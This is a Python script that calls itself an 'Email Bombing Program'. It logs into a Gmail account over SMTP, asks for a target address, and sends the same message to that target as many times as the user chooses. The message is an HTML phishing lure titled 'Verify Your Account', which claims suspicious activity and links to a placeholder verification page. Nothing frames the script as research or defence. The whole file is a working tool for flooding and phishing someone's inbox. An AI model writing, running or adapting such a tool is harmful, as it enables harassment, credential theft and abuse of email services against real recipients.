import smtplib  # Import the smtplib library to handle sending emails via SMTP
from email.mime.text import MIMEText  # Import MIMEText to create email body in text or HTML format
from email.mime.multipart import MIMEMultipart  # Import MIMEMultipart to handle multiple parts of an email (e.g., body and attachments)
import re  # For email validation
from getpass import getpass  # Import getpass to securely obtain the app password
from time import sleep  # Import sleep to add a delay between sending emails

def is_valid_email(email):
    # Simple regex for email validation
    regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(regex, email)

print("\n\n..:: Welcome to the Email Bombing Program ::..\n")
print("=" * 50)

while True:
    from_email = input("\n..:: Enter your email\t\t\t: ")
    if is_valid_email(from_email):
        break
    else:
        print("Invalid email format. Please try again.")

app_password = getpass("\n..:: Enter your email's app password\t: ")

server = None
try:
    # Initialize the SMTP server connection to Gmail's SMTP server on port 587
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()  # Upgrade the connection to a secure TLS encrypted connection
    server.login(from_email, app_password)  # Log in to the sender's Gmail account using the provided app_password
    
    print("\n\t ( $ _ $ ) Login successful!\n")
    
    while True:
        to_email = input("\n..:: Enter the target email's address\t\t\t\t: ")
        if is_valid_email(to_email):
            break
        else:
            print("Invalid email format. Please try again.")

    subject = input("\n..:: Enter the subject of the email (press enter to skip)\t: ")
    # Body content of the email (HTML format)
    body = """
    <html>
    <body>
        <h1 style="color: #2d89ef;">Verify Your Account</h1>
        <p>Dear User,</p>
        <p>We noticed suspicious activity in your account and need you to verify your account details to ensure continued access. 
        Please click the link below to confirm your account:</p>
        <p><a href="https://example.com/verify-account" style="color: #1d70b8; text-decoration: none;">Verify My Account</a></p>
        <p>If you did not initiate this request, please contact our support team immediately.</p>
        <p>Thank you,<br>Your Security Team</p>
    </body>
    </html>
    """
    num_emails = int(input("\n..:: Enter the number of times to send the email\t\t: "))

    print("\nSending emails...\n")

    # Loop to send the specified number of emails
    for i in range(num_emails):
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'html'))

        text = msg.as_string()
        try:
            server.sendmail(from_email, to_email, text)
            print(f"\t==> Email {i+1} sent successfully!")
            sleep(1)  # Sleep for 1 second between emails (adjust as necessary)

        except Exception as e:
            print(f"Error sending email {i + 1}: {e}")

    print("\nAll emails sent successfully!")

except smtplib.SMTPAuthenticationError:
    print("\nAuthentication failed. Please check your credentials and try again.")
except Exception as e:
    print(f"\nAn error occurred: {e}")
finally:
    if server:
        try:
            server.quit()
        except smtplib.SMTPServerDisconnected:
            print("Server already disconnected.")
    print("\nProgram terminated.\n")
